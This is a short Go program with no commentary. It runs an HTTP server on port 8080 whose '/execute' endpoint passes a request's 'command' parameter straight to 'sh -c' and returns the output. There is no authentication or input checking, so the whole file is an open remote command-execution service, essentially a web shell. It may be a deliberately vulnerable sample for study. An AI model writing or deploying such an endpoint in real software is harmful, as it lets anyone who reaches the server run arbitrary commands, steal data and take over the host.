package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os/exec"
)

type CommandOutput struct {
	Output string `json:"output"`
}

func main() {
	http.HandleFunc("/execute", func(w http.ResponseWriter, r *http.Request) {
		command := r.FormValue("command")
		output, err := executeCommand(command)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		response := CommandOutput{Output: output}
		json.NewEncoder(w).Encode(response)
	})

	http.ListenAndServe(":8080", nil)
}

func executeCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", err
	}
	return out.String(), nil
}
